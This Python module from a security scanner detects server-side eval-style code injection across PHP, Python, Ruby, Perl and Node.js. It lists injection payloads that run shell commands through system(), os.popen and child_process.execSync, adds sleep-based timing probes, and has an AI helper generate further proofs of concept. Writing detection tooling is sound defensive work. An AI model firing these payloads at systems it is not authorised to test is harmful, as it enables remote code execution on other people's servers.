"""Interpreted-language code injection detection (eval-style).

Targets endpoints that pass user input into a language ``eval``/``exec`` sink:
PHP, Python, Ruby, Perl, and Node.js. Proofs echo the success marker via the
language's own primitives, or fall back to a timing oracle for blind cases.
"""

from __future__ import annotations

from ..engine.models import Severity, Target
from .base import Module


class CodeInjection(Module):
    name = "code_injection"
    vuln_class = "Server-Side Code Injection"
    severity = Severity.CRITICAL
    remediation = (
        "Remove dynamic evaluation of user input (eval/exec/Function/System). "
        "Where dynamic behavior is required, use a safe interpreter or a strict "
        "allow-list of operations, and never concatenate request data into code."
    )

    def _payloads(self, marker: str) -> list[str]:
        m = marker
        return [
            # PHP
            f"phpinfo();//",
            f"echo '{m}';",
            f"';echo '{m}';//",
            f'";echo "{m}";//',
            f"system('echo {m}');",
            # Python
            f"__import__('sys').stdout.write('{m}')",
            f"print('{m}')",
            f"'+str(__import__('os').popen('echo {m}').read())+'",
            # Ruby
            f"puts '{m}'",
            f"#{{`echo {m}`}}",
            # Perl
            f"print '{m}';",
            # Node.js
            f"process.stdout.write('{m}')",
            f"require('child_process').execSync('echo {m}')",
            f"global.process.mainModule.require('child_process').execSync('echo {m}')",
            # arithmetic sanity (evaluates but no exec)
            f"{m}",
        ]

    def _time_payloads(self, seconds: int = 6) -> list[str]:
        return [
            f"sleep({seconds});",                                   # PHP
            f"__import__('time').sleep({seconds})",                 # Python
            f"sleep {seconds}",                                     # Ruby/Perl bare
            f"require('child_process').execSync('sleep {seconds}')",  # Node
        ]

    async def run(self, target: Target) -> None:
        for point in target.injection_points():
            marker = self.marker()
            payloads = self._payloads(marker)
            ai_extra = await self.ai_expand(
                point, marker,
                context=f"Possible eval-style code injection at {point.describe()} "
                        f"on {target.url}. Language unknown; provide multi-language "
                        "PoCs that echo the marker.",
            )
            hit = await self.try_payloads(point, payloads + ai_extra, marker,
                                          oracle="output")
            if hit:
                continue
            await self._confirm_time(point)

    async def _confirm_time(self, point) -> bool:
        seconds = 6
        baseline = await self.s.baseline(point)
        for payload in self._time_payloads(seconds):
            result = await self.s.probe(
                point=point, payload=payload, marker="",
                vuln_class=self.vuln_class, module=self.name,
            )
            if result is None:
                return False
            if result.elapsed >= baseline + (seconds - 1.5):
                confirm = await self.s.probe(
                    point=point, payload=payload, marker="",
                    vuln_class=self.vuln_class, module=self.name,
                )
                if confirm and confirm.elapsed >= baseline + (seconds - 1.5):
                    from ..engine.models import Confidence

                    confirm.verdict.verdict = "executed"
                    confirm.verdict.confidence = 0.85
                    confirm.verdict.signal = (
                        f"time-based eval: {confirm.elapsed:.1f}s vs {baseline:.1f}s"
                    )
                    self._record(confirm, oracle="time", confidence=Confidence.FIRM)
                    return True
        return False
